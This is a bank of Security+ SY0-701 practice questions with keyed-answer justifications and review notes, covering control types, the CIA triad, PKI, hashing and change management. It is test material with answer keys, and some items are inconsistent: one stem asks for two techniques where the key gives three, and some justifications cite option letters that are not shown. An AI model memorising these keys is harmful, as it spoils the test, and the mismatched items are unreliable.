exam.title: Importação externa - iakhator/comptia-security-plus-701
exam.notes: Third-party questions from https://github.com/iakhator/comptia-security-plus-701 @ 66fd929f6f52e71032bee425ec562f092fece57e (license: NOASSERTION, registry status: approved). All 336 items reviewed and approved by SME (needs_review=false, explanation_source=editor).

questions.question: A security administrator configures a firewall to block all traffic from known malicious IP addresses. Which type of security control is the firewall acting as in this scenario?
questions.justification: A firewall actively BLOCKS traffic — it prevents the threat from reaching the network. That makes it Preventive. It operates through software/hardware technology, making it Technical. Detective controls identify incidents after or during occurrence (like IDS logs). Corrective controls restore systems after an incident. Operational controls involve human procedures, not automated technology. The combination of Preventive + Technical is the classic firewall classification on the Security+ exam.
questions.review_notes: SME review: correct - Keyed answer B (Preventive, Technical) is correct for SY0-701 1.1; distractors are clearly wrong.

questions.question: A company places "Warning: This system is monitored" banners on all login screens. What type of security control is this?
questions.justification: Warning banners do NOT technically prevent access — a determined attacker can still attempt to log in after seeing the warning. They are designed to DISCOURAGE unauthorized access by making it clear that the system is monitored and that legal consequences may follow. This is the definition of a Deterrent control. Directive controls mandate specific actions (like a policy requiring password changes). Preventive controls actually block the action. Detective controls identify incidents after they occur.
questions.review_notes: SME review: correct - Keyed answer C (Deterrent) is correct for SY0-701 1.1; distractors are clearly wrong.

questions.question: After a malware infection, a security team uses antivirus software to remove the malware and restores systems to a known-good state using backups. Which control type BEST describes these actions?
questions.justification: Corrective controls act AFTER an incident has been detected to fix the damage and restore normal operations. Removing malware and restoring from backup are the textbook examples of corrective actions. Preventive controls stop incidents before they happen. Compensating controls substitute for a primary control that can't be implemented. Detective controls identify incidents as they occur or after. The incident already happened — corrective is the right answer here.
questions.review_notes: SME review: correct - Keyed answer B (Corrective) is correct for SY0-701 1.1; distractors are clearly wrong.

questions.question: A hospital cannot implement biometric authentication at all nursing stations due to budget constraints. Instead, they require nurses to use a PIN plus a proximity badge for access. What type of control is the PIN + badge combination in this context?
questions.justification: A compensating control is specifically used when the INTENDED primary control (biometrics) cannot be implemented for business, technical, or financial reasons. The PIN + badge serves as an alternative to achieve a similar security objective. This is the defining characteristic of compensating controls — they are substitutes, not enhancements. Note: if the biometrics were working and the PIN+badge were added ON TOP as extra security, that would be Preventive. But the scenario explicitly states biometrics can't be implemented, making this compensating.
questions.review_notes: SME review: correct - Keyed answer D (Compensating) is correct for SY0-701 1.1; distractors are clearly wrong.

questions.question: A company's security policy states: "All employees must complete annual security awareness training." What category AND type of control is this policy?
questions.justification: The CATEGORY is Managerial because this is a policy — it oversees and manages behavior rather than being implemented through technology or physical means. The TYPE is Directive because the policy mandates (directs) specific behavior — annual training is required. It's not Preventive because the policy itself doesn't technically prevent an attack; it directs behavior. Note: the TRAINING itself, when delivered, becomes an Operational Preventive control. But the POLICY mandating the training is Managerial Directive.
questions.review_notes: SME review: correct - Keyed answer A (Managerial, Directive) is correct for SY0-701 1.1; distractors are clearly wrong.

questions.question: A ransomware attack encrypts all of an organization's files, making them inaccessible to employees. Which component of the CIA Triad is PRIMARILY violated?
questions.justification: Ransomware ENCRYPTS files so authorized users CANNOT ACCESS them — this is a direct violation of Availability. Availability ensures that authorized users can access data when needed. Confidentiality would be violated if the attacker READ or EXFILTRATED the data — but encryption doesn't expose data, it locks it. Integrity would be violated if the data was MODIFIED without authorization. Non-repudiation involves proving who performed an action. This is one of the most commonly tested CIA Triad distinctions on the Security+ exam — ransomware = Availability, not Confidentiality.
questions.review_notes: SME review: correct - Keyed answer C (Availability) is correct for SY0-701 1.2; distractors are clearly wrong.

questions.question: An employee sends a digitally signed contract to a vendor. Three weeks later, the employee claims they never sent the contract. Which security property prevents the employee from making this denial?
questions.justification: Non-repudiation is the security property that prevents a party from denying they performed an action. The digital signature was created with the employee's private key — only they have access to it. This proves beyond reasonable doubt that they signed and sent the document. Integrity (C) ensures the document wasn't altered, but doesn't prove who sent it. Authentication (D) verifies identity at login time but doesn't provide ongoing proof of actions. Confidentiality protects data from unauthorized access. Non-repudiation is specifically about proving authorship and preventing denial after the fact.
questions.review_notes: SME review: correct - Keyed answer B (Non-repudiation) is correct for SY0-701 1.2; distractors are clearly wrong.

questions.question: In the Zero Trust architecture, which component is responsible for making the actual access decision — evaluating whether a user's request meets policy requirements?
questions.justification: In Zero Trust, the Policy Engine is the component that evaluates access requests against defined policies in real time and makes the grant/deny DECISION. The Policy Administrator (B) manages and distributes policies but doesn't make individual decisions. The Policy Enforcement Point (A) ENFORCES the decision made by the engine — it's the actual checkpoint (firewall, proxy, etc.) where access is granted or blocked. Adaptive Identity (D) allows dynamic permission changes based on context but is an attribute fed INTO the engine, not the decision-maker itself. Think: Engine = decides, Administrator = manages policies, Enforcement Point = acts on decisions.
questions.review_notes: SME review: correct - Keyed answer C (Policy Engine) is correct for SY0-701 1.2; distractors are clearly wrong.

questions.question: Which of the following physical security controls is BEST described as both a Preventive AND a Deterrent control depending on context?
questions.justification: A security fence can serve dual roles: it PREVENTS entry by creating a physical barrier that most people cannot easily cross (Preventive), AND it DETERS potential intruders who see the fence and decide not to attempt entry (Deterrent). Pressure sensors and ultrasonic sensors are purely Detective — they identify intrusion after the perimeter is crossed. Audit logs are Detective — they record what happened. The fence is the classic example of a dual-role physical control. Note: a camera is similarly both Detective and Deterrent. These dual-role controls frequently appear on the exam.
questions.review_notes: SME review: correct - Keyed answer B (Security fence) is correct for SY0-701 1.1; distractors are clearly wrong.

questions.question: A user authenticates with a username and password and is then granted access only to the files their job role requires. Which AAA components are demonstrated?
questions.justification: Authentication: The username and password verify the user's identity ("Who are you?"). Authorization: Access only to files their job role requires demonstrates permissions based on role — this is RBAC in action ("What can you do?"). Accounting (audit logging) is not mentioned in this scenario — there's no reference to tracking or logging activity. The question specifically asks what is DEMONSTRATED in the scenario, not what should exist. Authentication + Authorization = the two explicitly shown AAA components here.
questions.review_notes: SME review: correct - Keyed answer D (Authentication and Authorization) is correct for SY0-701 1.2; distractors are clearly wrong.

questions.question: A security consultant performs a gap analysis for a retail company preparing for PCI DSS compliance. The FIRST step in this process is to:

options.text: Assess the current security posture and existing controls
Implement compensating controls for identified gaps
Define the PCI DSS requirements as the target state
Develop an action plan to close identified gaps

questions.justification: Gap analysis follows this sequence: (1) Current State Assessment — understand what you HAVE now. (2) Define target/future state — what does PCI DSS/HIPAA/NIST require? (3) Identify gaps — differences between current and target. (4) Create action plan — how to close gaps. You MUST know where you are before you can determine where you need to go. Implementing controls (B) and developing action plans (D) come after gaps are identified. Defining the target (C) is step 2, not step 1. Understanding your current state is always the starting point in any gap analysis.
questions.review_notes: SME review: correct - Keyed A is defensible: gap analysis starts by assessing current posture before comparing against the target framework; some texts start from the target, but A is the standard answer.

questions.question: Before deploying a major firewall rule update in a production environment, the security team creates a plan that details how to undo all changes if the update causes problems. This plan is BEST described as:
questions.justification: A backout plan (also called a rollback plan) is the predefined procedure to REVERSE a change if it causes issues. It must be created BEFORE implementing the change, not during or after a problem occurs. Impact analysis (B) assesses the potential effects of a change before implementation — but it doesn't describe how to undo it. An SOP (A) documents how to perform a task correctly. A maintenance window (D) is a scheduled time period for making changes. The critical distinguisher is "undo all changes if problems occur" — that's the backout plan definition.
questions.review_notes: SME review: correct - Keyed answer C (Backout plan) is correct for SY0-701 1.3; distractors are clearly wrong.

questions.question: A company's development team needs to test their new application using realistic data patterns, but regulations prohibit using real customer data in test environments. Which technique BEST addresses this requirement?
questions.justification: Data masking replaces sensitive data with realistic but FAKE data that preserves the same format and structure. This is specifically designed for development/testing environments where teams need data with realistic patterns (correct format, appropriate length, valid structure) without exposing actual sensitive values. Tokenization (A) replaces data with random tokens that have no structural resemblance — good for payment processing but not for testing that requires realistic data patterns. Encryption (B) makes data unreadable and requires a key to decrypt — not useful for testing. Hashing (C) is one-way and irreversible — can't test with hashed data. Masking preserves usability while protecting privacy.
questions.review_notes: SME review: correct - Keyed answer D (Data masking) is correct for SY0-701 1.4; distractors are clearly wrong.

questions.question: An organization runs a critical business system on software that has not received security updates in three years because the vendor no longer supports it. What is this MOST accurately described as?
questions.justification: A legacy application is one that is outdated, often no longer supported by its vendor, and may not comply with modern security standards. The defining characteristics: old software, no longer receiving patches/updates, vendor support has ended. This creates significant security risk because known vulnerabilities will never be patched. The recommended response is isolation, migration, or decommissioning. Option A (dependency) refers to reliance between systems — not the status of an unsupported system. Option C (restricted activity) refers to limiting what users can do. Option D (compensating control) is a substitute control used when a primary control can't be implemented.
questions.review_notes: SME review: correct - Keyed answer B (A legacy application) is correct for SY0-701 1.3; distractors are clearly wrong.

questions.question: A network administrator updates a firewall's access control list to allow a new application. They fail to update the network architecture diagram afterward. What is the SECURITY risk of this omission?

options.text: Future security reviews may miss the new rule, leaving a misconfiguration undetected
The ACL change will be automatically reverted without documentation
The application will lose connectivity due to missing documentation
Compliance audits cannot occur without updated diagrams

questions.justification: When network diagrams are not updated after changes, the documentation no longer reflects the actual security architecture. Future security reviews, penetration tests, or compliance audits work from the documentation — if the diagram is wrong, they won't know to check the new ACL rule, leaving potential misconfigurations undetected. The firewall rule still exists and the application still works (C and B are wrong). While audits may flag documentation gaps (D), the PRIMARY security risk is that accurate security assessments become impossible when the documented architecture doesn't match reality. This is why documentation updates are a formal requirement in change management.
questions.review_notes: SME review: correct - Keyed answer A (Future security reviews may miss the new rule, leaving a misconfiguration undete) is correct for SY0-701 1.3; distractors are clearly wrong.

questions.question: Which of the following BEST explains why asymmetric encryption is used to establish a TLS session instead of using asymmetric encryption for the entire session?

options.text: Asymmetric encryption does not provide confidentiality
Asymmetric keys cannot be used for bulk data encryption
Asymmetric encryption is slower; symmetric is used for performance once keys are exchanged
Symmetric encryption provides stronger security than asymmetric

questions.justification: Asymmetric encryption is computationally SLOW because of the mathematical complexity of public/private key operations. It's excellent for securely exchanging a symmetric key (the TLS handshake) but impractical for encrypting large amounts of session data. Once both parties share the symmetric session key (established via asymmetric), they switch to symmetric (like AES) for all data transfer — which is orders of magnitude faster. This hybrid approach gives you the security of asymmetric key exchange with the performance of symmetric encryption. Option D is wrong — asymmetric isn't "stronger," it solves a different problem (key distribution). Option A is wrong — asymmetric absolutely provides confidentiality.
questions.review_notes: SME review: correct - Keyed answer C (Asymmetric encryption is slower; symmetric is used for performance once keys are) is correct for SY0-701 1.4; distractors are clearly wrong.

questions.question: A password stored as: $2b$12$salted-hash-value-here uses bcrypt. What TWO cryptographic techniques are being used here?
questions.justification: bcrypt uses ALL THREE techniques simultaneously: (1) Hashing — the password is converted to a one-way hash. (2) Salting — a random salt is added before hashing, preventing rainbow table attacks. (3) Key stretching — bcrypt applies the hash function thousands of times (the "12" in $2b$12$ is the cost factor, meaning 2^12 iterations). This makes brute-force attacks extremely slow. The stored format includes the salt and cost factor, allowing the same hash to be reproduced for verification. bcrypt does NOT use encryption (reversible) or asymmetric keys. This is the most secure common approach for password storage.
questions.review_notes: SME review: correct - Key B (hashing, salting, key stretching) is correct for bcrypt, but the stem asks for 'TWO' techniques while the key lists three; stem wording should be fixed.

questions.question: A web developer installs a certificate on their local development server to test HTTPS. The certificate was created using their own server's private key without involving any Certificate Authority. Users see a browser warning when visiting the site. What type of certificate is this?
questions.justification: A self-signed certificate is created and signed by the same entity that will use it — no Certificate Authority validates or signs it. The defining indicators: created with own server's key, no CA involvement, browser shows security warning (browsers don't trust self-signed certs because there's no trusted third party verifying the identity). Self-signed certs are acceptable for internal testing and development but should NEVER be used in production. A wildcard cert (B) would still be issued by a CA but covers multiple subdomains. A third-party cert (C) comes from a trusted CA. A root cert (D) is the CA's own certificate at the top of the trust chain.
questions.review_notes: SME review: correct - Keyed answer A (Self-signed certificate) is correct for SY0-701 1.4; distractors are clearly wrong.

questions.question: A Certificate Authority discovers that one of its issued certificates was obtained fraudulently. What is the IMMEDIATE action the CA should take?

options.text: Wait for the certificate to expire naturally
Revoke the certificate and publish it to the CRL/OCSP
Issue a new certificate to the legitimate owner
Notify the certificate holder and remove it from the honeynet

questions.justification: When a certificate is fraudulent or compromised, the CA must REVOKE it immediately — not wait for expiration (which could be years away). Revocation means adding the certificate's serial number to the Certificate Revocation List (CRL) and/or updating the OCSP responder status to "revoked." This tells all clients (browsers, applications) to reject the certificate immediately. Waiting for expiration (A) would leave the fraudulent certificate trusted for potentially years. Issuing a new certificate (C) to the legitimate owner may also be needed, but doesn't fix the fraudulent one. Honeynets (D) have nothing to do with certificate management.
questions.review_notes: SME review: correct - Keyed answer B (Revoke the certificate and publish it to the CRL/OCSP) is correct for SY0-701 1.4; distractors are clearly wrong.

questions.question: An organization wants to secure their HTTPS communications across www.example.com, mail.example.com, shop.example.com, and api.example.com using a SINGLE certificate. Which certificate type should they use?
questions.justification: A wildcard certificate uses an asterisk (*) as a placeholder for subdomains. A certificate for *.example.com automatically covers www.example.com, mail.example.com, shop.example.com, api.example.com — any subdomain one level deep. One certificate manages all subdomains, reducing administrative overhead and cost. Option C would require purchasing and managing separate certificates for each subdomain. Important limitation: wildcard certs cover ONE level of subdomains only — *.example.com does NOT cover sub.www.example.com (two levels). For multiple levels, you'd need a SAN (Subject Alternative Name) certificate or multiple wildcards.
questions.review_notes: SME review: correct - Keyed answer D (Wildcard certificate for *.example.com) is correct for SY0-701 1.4; distractors are clearly wrong.

questions.question: A developer hides a secret message inside a JPEG photo by modifying the least significant bits of the image data. The image appears normal to viewers. What technique is being used?
questions.justification: Steganography is the practice of HIDING the existence of a message within another, innocent-looking medium. The key distinction from encryption: encryption scrambles data so it's unreadable but VISIBLE as encrypted data. Steganography hides the data so its EXISTENCE is concealed — the image looks completely normal to anyone viewing it. Modifying least significant bits is the classic steganographic technique for images. Data masking (B) substitutes fake data in databases. Tokenization (C) replaces sensitive data with random tokens. Encryption (D) makes data unreadable but doesn't hide that data exists. "Hidden inside an image with no visible change" = steganography every time.
questions.review_notes: SME review: correct - Keyed answer A (Steganography) is correct for SY0-701 1.4; distractors are clearly wrong.

questions.question: A company's laptop contains sensitive data. They want to ensure that if the laptop is stolen and the hard drive removed and connected to another machine, the data remains unreadable. What is the MOST appropriate solution?
questions.justification: Full-disk encryption (FDE) like BitLocker with TPM encrypts the ENTIRE disk including OS, temp files, swap space, and all data. When the drive is removed and connected to another machine, all data is unreadable without the encryption key stored in the TPM of the original machine. File-level encryption (A) only protects specifically encrypted files — temp files, swap files, and unencrypted system files remain readable. A strong password (B) only protects the OS login — removing the drive bypasses the OS entirely. Database encryption (D) only protects structured database data, not everything on the drive. FDE + TPM is specifically designed for the "stolen laptop / removed drive" threat scenario.
questions.review_notes: SME review: correct - Keyed answer C (Full-disk encryption with TPM) is correct for SY0-701 1.4; distractors are clearly wrong.

questions.question: A financial institution needs to accept credit card numbers but wants to ensure that merchants never store, process, or transmit actual card numbers. Which technique BEST achieves this while still allowing the merchant to reference the transaction?
questions.justification: Tokenization replaces the credit card number with a random TOKEN that the merchant stores and uses for future reference. The actual card number is stored only in the secure token vault, not at the merchant. If the merchant's database is breached, attackers only get tokens — worthless without the vault. This is precisely how PCI DSS compliance works in practice. Data masking (A) creates fake but realistic data for testing — it doesn't allow referencing back to the original. Hashing (C) is one-way irreversible — you can't reverse it to charge the card later. Steganography (D) hides data within other data, not relevant here. Tokenization is specifically designed for payment card security.
questions.review_notes: SME review: correct - Keyed answer B (Tokenization) is correct for SY0-701 1.4; distractors are clearly wrong.

questions.question: During a TLS handshake, an organization wants to ensure that even if their long-term private key is later compromised, past session data cannot be decrypted. Which feature provides this protection?
questions.justification: Perfect Forward Secrecy (PFS) generates a unique, temporary session key for EACH TLS session using ephemeral Diffie-Hellman key exchange (DHE or ECDHE). These session keys are never stored — they exist only for the duration of the session. Even if an attacker records encrypted traffic now and later obtains the server's private key, they CANNOT decrypt past sessions because each session used a unique ephemeral key that was never saved. Key escrow (A) stores keys for recovery — the opposite of what we want here. Digital signatures (B) provide authentication and non-repudiation. Certificate pinning (C) prevents certificate substitution attacks. PFS is specifically about protecting historical sessions from future key compromise.
questions.review_notes: SME review: correct - Keyed answer D (Perfect Forward Secrecy (PFS)) is correct for SY0-701 1.4; distractors are clearly wrong.

questions.question: An attacker intercepts network traffic and modifies a financial transaction, changing the amount from $100 to $10,000 before the packet reaches the bank. Which aspect of the CIA Triad is violated?
questions.justification: Integrity ensures data remains ACCURATE and UNALTERED during transmission. The attacker modified the transaction value — this is a direct integrity violation. The data is no longer what the sender intended. Confidentiality would be violated if the attacker READ the transaction details (the scenario doesn't mention this). Availability would be violated if the transaction was prevented from reaching the bank. While an on-path (man-in-the-middle) attack CAN violate both Integrity AND Confidentiality, the scenario specifically describes only modification (not reading), so Integrity is the primary violation described. When the exam specifies a single action, answer based on that specific action.
questions.review_notes: SME review: correct - Keyed answer B (Integrity) is correct for SY0-701 1.2; distractors are clearly wrong.

questions.question: A security administrator needs to verify that a critical configuration file has not been modified since it was deployed. Which technique provides the BEST method to detect unauthorized changes?

options.text: Encrypt the configuration file with AES-256
Store the file in a read-only directory
Generate a cryptographic hash of the file and compare periodically
Create a digital signature using the admin's private key

questions.justification: Hashing is specifically designed for integrity verification. Generate a SHA-256 hash of the file when it's deployed (known-good state). Periodically rehash the file and compare. If the hash values differ, even by one character, the hashes will be completely different, immediately detecting any modification. Encryption (A) protects confidentiality but doesn't detect changes once decrypted — an attacker could modify the decrypted file. Read-only directory (B) is a preventive control that tries to block changes, but can be bypassed by attackers with sufficient privileges and doesn't DETECT changes that occurred. Digital signatures (D) could work but are designed for authentication of the signer, not periodic integrity monitoring. Hashing is the standard for File Integrity Monitoring (FIM).
questions.review_notes: SME review: correct - Keyed answer C (Generate a cryptographic hash of the file and compare periodically) is correct for SY0-701 1.4; distractors are clearly wrong.

questions.question: A company's security team uses a version control system like Git for all configuration files. An unauthorized configuration change is discovered. What does version control MOST directly enable in this situation?

options.text: Identifying who made the change, when, and reverting to the known-good version
Encrypting configuration files to prevent unauthorized access
Alerting the SIEM when changes occur

questions.justification: Version control systems like Git maintain a complete history of all changes: who made each change (commit author), when it was made (timestamp), what was changed (diff), and the ability to revert to any previous version. When an unauthorized change is discovered, version control enables immediate forensic investigation (who? when? what?) AND rapid remediation (revert to the last known-good version). Version control does NOT automatically block changes (B) — it records them. It doesn't encrypt files (C) — that's a separate concern. While some CI/CD pipelines integrate with SIEM (D), that's not a core Git function. The audit trail + revert capability is the direct value of version control in security.
questions.review_notes: SME review: correct - Keyed answer A (Identifying who made the change, when, and reverting to the known-good version) is correct for SY0-701 1.3; distractors are clearly wrong.

questions.question: Which of the following BEST describes the difference between a CRL and OCSP for certificate validation?

options.text: CRL checks single certificates; OCSP downloads a full list
OCSP is used for internal certificates; CRL for public certificates
CRL is a downloadable list checked periodically; OCSP provides real-time single-certificate status
CRL and OCSP perform identical functions using different protocols

questions.justification: CRL (Certificate Revocation List): The CA publishes a list of ALL revoked certificate serial numbers. Clients periodically DOWNLOAD this full list and check locally. Issues: large file size, can be stale between updates. OCSP (Online Certificate Status Protocol): Client sends a query for ONE specific certificate's status to the OCSP responder. Responds immediately with "good," "revoked," or "unknown." Issues: requires responder to be online, adds latency. OCSP Stapling improves this by having the server attach a recent OCSP response to the TLS handshake. Option A has it backwards. Option B is incorrect — both work for public and internal certificates. Option D is wrong — they have different mechanisms and trade-offs.
questions.review_notes: SME review: correct - Keyed answer C (CRL is a downloadable list checked periodically; OCSP provides real-time single-) is correct for SY0-701 1.4; distractors are clearly wrong.

questions.question: SCENARIO: A security auditor reviews the following situation — "An employee shared their access badge with a contractor to avoid the approval process for temporary access. The contractor used the badge to access the data center, where they connected an unauthorized USB device to a server."Identify the CORRECT mapping: Which THREE control failures does this scenario demonstrate?

options.text: Preventive (badge sharing policy violated), Technical (no USB blocking), Detective (no camera caught it)
Deterrent (no visible cameras), Corrective (no incident response), Compensating (no alternative access)
Managerial (no policy enforced), Physical (badge shared circumventing access control), Technical (USB port not disabled)
Directive (insufficient policy), Operational (badge sharing allowed), Technical (server not encrypted)

questions.justification: This scenario reveals three distinct control failures across categories: (1) Managerial control failure — there was no enforced policy preventing badge sharing, OR the policy existed but wasn't managed/monitored effectively. The approval process was bypassed with no consequence. (2) Physical control failure — access badges are physical controls. The badge was shared, circumventing the physical access control system. The system assumed one badge = one person but didn't enforce it. (3) Technical control failure — USB ports on servers were not disabled or blocked. Technical controls like endpoint protection or port blocking should prevent unauthorized USB devices. Option A mixes types and categories incorrectly. Option B is wrong about cameras and corrective. Option D incorrectly frames encryption as the USB issue — it's about port access, not encryption.
questions.review_notes: SME review: correct - Key C maps correctly to the SY0-701 control categories (managerial, physical, technical), but the long multi-part option format is unlike the real exam and option A/D mix categories and types loosely.

questions.question: A company deploys security cameras throughout its facility. Which control category BEST describes this implementation?
questions.justification: Security cameras are physical controls because they exist in the real world (not software/policy). They are detective controls because they RECORD and help identify incidents — they do not prevent entry. A physical preventive control would be a locked door or barrier. A technical control would be software like IDS. Detective = identify/record during or after; Preventive = stop before occurrence.
questions.review_notes: SME review: correct - Keyed answer C (Physical, Detective) is correct for SY0-701 1.1; distractors are clearly wrong.

questions.question: A financial institution requires that no single employee can both initiate AND approve a wire transfer. Which security principle does this BEST illustrate?
questions.justification: Separation of duties (SoD) ensures no single person can complete a high-risk transaction from start to finish — preventing fraud and errors. One person initiates, another approves. Dual control (D) is similar but requires TWO people to simultaneously perform one action (like two-person launch codes) rather than splitting sequential steps. Least privilege limits permissions; need-to-know limits information access. SoD = split the task.
questions.review_notes: SME review: correct - Keyed answer A (Separation of duties) is correct for SY0-701 5.1; distractors are clearly wrong.

questions.question: The CIA triad component that ensures data has NOT been altered or tampered with is BEST described as:
questions.justification: Integrity ensures data is accurate, complete, and not altered without authorization. Hash functions (MD5, SHA-256) verify integrity — if the hash changes, data was modified. Confidentiality = only authorized parties can access data. Availability = data is accessible when needed. Non-repudiation = proof that an action occurred (digital signatures). The exam often tests these definitions — Integrity = not tampered with.
questions.review_notes: SME review: correct - Keyed answer B (Integrity) is correct for SY0-701 1.2; distractors are clearly wrong.

questions.question: An attacker floods a web server with millions of requests, making it unavailable to legitimate users. Which CIA triad component is being violated?
questions.justification: A DDoS (Distributed Denial of Service) attack targets Availability — the server can't respond to legitimate users. The data isn't stolen (Confidentiality) or modified (Integrity) — it's simply unavailable. Availability controls include load balancers, redundancy, DDoS mitigation services (like Cloudflare), and rate limiting. Any time a system is "taken down" or made unreachable, think Availability violation.
questions.review_notes: SME review: correct - Keyed answer C (Availability) is correct for SY0-701 1.2; distractors are clearly wrong.

questions.question: Which authentication factor type does a fingerprint scan represent?
questions.justification: Biometrics (fingerprint, iris scan, facial recognition, voice recognition) are "Something you are" — they are inherent physical characteristics. Something you know = passwords, PINs, security questions. Something you have = smart card, hardware token, phone (OTP). Somewhere you are = GPS location, IP address-based access. MFA requires at least two DIFFERENT factor types — two passwords is not MFA.
questions.review_notes: SME review: correct - Keyed answer C (Something you are) is correct for SY0-701 4.6; distractors are clearly wrong.

questions.question: A user's account shows login attempts from both New York and Tokyo within the same 5-minute window. What authentication concept would flag this as suspicious?
questions.justification: Context-aware (adaptive) authentication analyzes location, time, device, and behavior patterns. "Impossible travel" is a specific detection — it's physically impossible to be in New York and Tokyo simultaneously. Modern UEBA (User and Entity Behavior Analytics) and CASB tools flag this. This is also an indicator of credential compromise. The answer ties to location-based ("somewhere you are") and behavioral authentication factors.
questions.review_notes: SME review: correct - Keyed answer D (Impossible travel / Context-aware authentication) is correct for SY0-701 4.6; distractors are clearly wrong.

questions.question: A change management board approves switching a production database server. A technician begins work but discovers a dependent application would break. What should the technician do FIRST?

options.text: Halt the change and escalate to the change board
Proceed — the board already approved it
Fix the dependent application first, then proceed

questions.justification: Change management exists to prevent unauthorized or unplanned modifications. If unexpected impacts are discovered MID-change, the technician must stop and escalate — not improvise. The change board needs to reassess. Every change requires documented backout/rollback procedures for exactly this reason. "Proceed because it was approved" (B) ignores the new risk. "Fix the app first" (C) introduces additional unauthorized changes. Escalation is always the correct first step when unexpected issues arise.
questions.review_notes: SME review: correct - Keyed answer A (Halt the change and escalate to the change board) is correct for SY0-701 1.3; distractors are clearly wrong.

questions.question: What is the PRIMARY purpose of version control in a change management program?

options.text: Track and manage changes to configuration and code over time

questions.justification: Version control (Git, SVN) tracks every change to code or configuration — who changed what, when, and why. This is critical for change management: it creates an audit trail, enables rollback to previous versions, identifies who introduced a bug, and supports accountability. On the Security+ exam, version control is tied to change management and configuration management baselines. It supports integrity and accountability, not encryption or vulnerability scanning.
questions.review_notes: SME review: correct - Keyed answer C (Track and manage changes to configuration and code over time) is correct for SY0-701 1.3; distractors are clearly wrong.

questions.question: Which encryption algorithm is considered BROKEN and should NOT be used for securing sensitive data?
questions.justification: DES (Data Encryption Standard) uses only 56-bit keys, which can be brute-forced by modern hardware in hours. It was cracked publicly in 1998. DES was replaced by 3DES (which is also being deprecated) and then AES. AES-128 and AES-256 are current standards — AES-256 is used by the NSA for Top Secret data. ChaCha20 is a modern stream cipher used in TLS 1.3. Any question asking about "broken" symmetric encryption → DES or RC4.
questions.review_notes: SME review: correct - Keyed answer A (DES (56-bit)) is correct for SY0-701 1.4; distractors are clearly wrong.

questions.question: A developer needs to verify that a downloaded file has not been corrupted or tampered with during transfer. Which cryptographic technique should be used?
questions.justification: Hash functions produce a fixed-length digest ("fingerprint") of a file. The developer computes the hash of the downloaded file and compares it to the published hash. If they match, the file is intact. Encryption (symmetric or asymmetric) provides confidentiality, not integrity verification. Digital certificates authenticate identities. Hash functions = integrity checking. Common exam scenario: software vendors publish SHA-256 hashes alongside downloads so users can verify integrity.
questions.review_notes: SME review: correct - Keyed answer B (Cryptographic hash function (SHA-256)) is correct for SY0-701 1.4; distractors are clearly wrong.

questions.question: Which key exchange protocol provides Perfect Forward Secrecy (PFS), ensuring that session keys cannot be compromised even if the server's private key is later stolen?
questions.justification: Perfect Forward Secrecy requires ephemeral (temporary) key exchange — a NEW session key is generated for each session and discarded afterward. Even if the server's long-term private key is stolen, past sessions can't be decrypted. ECDHE and DHE (Ephemeral Diffie-Hellman) provide PFS. Static RSA and static DH do NOT provide PFS because the same key material can decrypt recorded past sessions. TLS 1.3 mandates PFS — it only allows ECDHE and DHE cipher suites.
questions.review_notes: SME review: correct - Keyed answer C (ECDHE (Ephemeral ECDH)) is correct for SY0-701 1.4; distractors are clearly wrong.

questions.question: What is the purpose of a Certificate Revocation List (CRL) in a PKI environment?

options.text: List all certificates issued by a CA
Encrypt traffic between clients and servers
Publish a list of certificates that have been revoked before expiration

questions.justification: CRL (Certificate Revocation List) is a list maintained by the CA of certificates that were revoked BEFORE their expiration date — due to compromise, employee departure, policy change, etc. Clients check the CRL to verify a certificate hasn't been revoked. OCSP (Online Certificate Status Protocol) is the modern, real-time alternative to CRL. Remember: certificates expire naturally OR can be revoked early. CRL = list of early revocations. OCSP = real-time status check.
questions.review_notes: SME review: correct - Keyed answer D (Publish a list of certificates that have been revoked before expiration) is correct for SY0-701 1.4; distractors are clearly wrong.

questions.question: A company uses HSMs to protect cryptographic keys. What is the PRIMARY advantage of using an HSM over software key storage?

options.text: Keys never leave the hardware in plaintext, providing tamper-resistant protection
HSMs are faster than software encryption
HSMs replace the need for certificates

questions.justification: HSM (Hardware Security Module) is purpose-built hardware that stores and uses keys inside tamper-resistant hardware. The private key NEVER leaves the HSM in plaintext — even if the server is compromised, the attacker cannot extract the key. All cryptographic operations happen inside the HSM. If tampered with, HSMs self-destruct (zeroize) their keys. Used by banks, CAs, and governments. TPM chips in laptops serve a similar but more limited function for consumer devices.
questions.review_notes: SME review: correct - Keyed answer A (Keys never leave the hardware in plaintext, providing tamper-resistant protectio) is correct for SY0-701 1.4; distractors are clearly wrong.

questions.question: A web server's TLS certificate chains up through an Intermediate CA to a Root CA. Why are intermediate CAs used instead of having the Root CA sign all certificates directly?

options.text: Root CAs cannot process HTTPS traffic
To keep the Root CA offline and protected; if an intermediate is compromised, only its certificates need revocation
Intermediate CAs use stronger encryption than Root CAs
This is required by HTTPS protocol standards

questions.justification: Root CAs are kept OFFLINE (air-gapped) in maximum security vaults. If a Root CA is compromised, ALL trust collapses — every certificate signed by it becomes untrustworthy, affecting millions of websites. By using intermediates, the Root CA only signs a handful of intermediate certificates. If one intermediate is compromised, only its certificates need revocation. The Root stays protected. This is the chain of trust model — Root → Intermediate → End-Entity certificate.
questions.review_notes: SME review: correct - Keyed answer B (To keep the Root CA offline and protected; if an intermediate is compromised, on) is correct for SY0-701 1.4; distractors are clearly wrong.

questions.question: What does the security concept of "non-repudiation" ensure?

options.text: Only authorized users can access sensitive data
Data cannot be altered during transmission
A party cannot deny performing an action they took
Systems remain available even during attacks

questions.justification: Non-repudiation provides proof that a specific party performed a specific action. Digital signatures provide non-repudiation — when Alice signs an email with her private key, she cannot later deny sending it (only she has that key). Audit logs also support non-repudiation. This is critical in legal and financial contexts. Compare: Confidentiality (A), Integrity (B), Availability (D) are the CIA triad components. Non-repudiation sits outside the triad but is equally important.
questions.review_notes: SME review: correct - Keyed answer C (A party cannot deny performing an action they took) is correct for SY0-701 1.2; distractors are clearly wrong.

questions.question: An organization implements a policy where users are assigned only the permissions they need for their specific job role — and no more. Which principle does this reflect?
questions.justification: Least privilege = minimum permissions required to perform job duties, and nothing more. A marketing intern should not have database admin rights. Separation of duties = split high-risk tasks between multiple people. Defense in depth = multiple layered security controls. Zero trust = "never trust, always verify" — no implicit trust based on network location. The key phrase in the question is "only the permissions they need for their specific job" — that's the definition of least privilege.
questions.review_notes: SME review: correct - Keyed answer A (Least privilege) is correct for SY0-701 4.6; distractors are clearly wrong.

questions.question: A system stores passwords using MD5 hashing without any salt. Why is this considered insecure?

options.text: MD5 is too slow for password storage
MD5 is cryptographically broken and vulnerable to rainbow table attacks without salting
MD5 requires more storage space than modern algorithms
MD5 cannot hash passwords longer than 16 characters

